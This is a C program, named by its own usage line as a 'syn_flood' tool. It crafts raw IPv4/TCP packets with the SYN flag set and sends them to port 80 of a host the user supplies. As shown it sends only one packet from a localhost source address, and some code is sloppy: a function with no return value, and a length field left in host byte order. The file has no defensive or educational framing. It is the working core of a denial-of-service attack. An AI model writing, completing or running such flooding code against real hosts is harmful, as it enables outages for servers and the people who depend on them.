#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>        
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/tcp.h>

#define BUFFER_SIZE 4096


struct pseudo_header
{
    unsigned int src_addr;
    unsigned int dest_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_len;
    struct tcphdr tcp;
};

int
get_ip_from_host (char *ipbuf, const char *host, int maxlen)
{
    struct hostent      *he;
    struct sockaddr_in  sa;

    bzero (&sa, sizeof(sa));
    sa.sin_family = AF_INET;

    if (inet_aton (host, &sa.sin_addr) == 0)
    {
        he = gethostbyname (host);
        if (he == NULL)
            return -1;
        memcpy (&sa.sin_addr, he->h_addr, sizeof (struct in_addr));
    }
    strncpy (ipbuf, inet_ntoa (sa.sin_addr), maxlen);
    return 0;
}

int 
get_local_ip ( char * buffer)
{
    int sock = socket ( AF_INET, SOCK_DGRAM, 0);

    const char* kGoogleDnsIp = "8.8.8.8";
    int dns_port = 53;

    struct sockaddr_in serv;

    memset( &serv, 0, sizeof(serv) );
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
    serv.sin_port = htons( dns_port );

    int err = connect( sock , (const struct sockaddr*) &serv , sizeof(serv) );

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);

    const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

    close(sock);
}

unsigned short 
csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}


int
main(int argc, char *argv[])
{
    struct iphdr	     *iph;
    struct tcphdr	     *tcph;
    struct in_addr       srcd_ip, dest_ip;
    struct sockaddr_in   dest;
    struct pseudo_header psh;
    char   datagram[BUFFER_SIZE], des_ip[128] = {'\0'}, src_ip[128] = {'\0'};

    if(argc < 2) {
        printf("./syn_flood host\n");
        exit(-1);
    }

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("create socket");
        exit(-1);
    }
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));

    get_ip_from_host(des_ip, argv[1], sizeof(des_ip));
    if (inet_pton (AF_INET, des_ip, &dest_ip.s_addr) <= 0)
    {
        perror("inet_pton");
        exit(-1);
    }

    get_ip_from_host(src_ip, "localhost", sizeof(src_ip));
    if (inet_pton (AF_INET, src_ip, &srcd_ip.s_addr ) <= 0)
    {
        perror("inet_pton");
        exit(-1);
    }


    memset(datagram, '\0', sizeof(datagram));

    //ip header version
    iph->version = 4;
    //ip header length
    iph->ihl = 5;
    //ip header type of service
    iph->tos = 0;
    // total length
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);	
    //identifier
    iph->id = htons(54321);
    //fragmented offset, high 3 bits flags, low 13 bits offset, 0b100000000000000
    iph->frag_off = htons(16384);
    //time to live
    iph->ttl = 64;
    //protocol IPPROTO_TCP = 6
    iph->protocol = IPPROTO_TCP;
    //check sum ,set to 0 before calculating
    iph->check = 0;
    //set src ip addrss
    iph->saddr = srcd_ip.s_addr;
    //set dest ip address
    iph->daddr = dest_ip.s_addr;
    //chekc sum 
    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons(43591);
    tcph->dest = htons(80);
    tcph->seq = htonl(110502497);
    tcph->ack_seq = 0;
    tcph->doff = sizeof(struct tcphdr) / 4;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(43690);
    tcph->urg_ptr = 0;

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
        perror("setsockopt");
        exit(0);
    }

    bzero(&dest, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = dest_ip.s_addr;
    dest.sin_port = htons(80);

    tcph->check = 0;

    //get_ip_from_host(src_ip, "localhost", sizeof(src_ip));
    //if (inet_pton (AF_INET, src_ip, &psh.src_addr) <= 0){
    //    perror("inet_pton");
    //    exit(-1);
    //}
    psh.src_addr = srcd_ip.s_addr;
    psh.dest_addr = dest_ip.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len = htons(sizeof(struct tcphdr));
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)&psh, sizeof(psh));

    //start_sniffer();
    if (sendto(s, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0 )
    {
        perror("sendto");
        exit(-1);
    }

    //get_ip_from_host(src_ip, "localhost", sizeof(src_ip));
    //if (inet_pton(AF_INET, src_ip, &(iph->saddr)) <= 0){
    //    perror("inet_pton");
    //    exit(-1);
    //}
    //char str[BUFFER_SIZE] = { 0 };
    //inet_ntop(AF_INET, &(iph->saddr), str, INET_ADDRSTRLEN);
    //printf("%s\n", str);

    //memset(str, '\0', sizeof(str));
    //iph->daddr = dest_ip.s_addr;
    //inet_ntop(AF_INET, &(iph->daddr), str, INET_ADDRSTRLEN);
    //printf("%s\n", str);
}
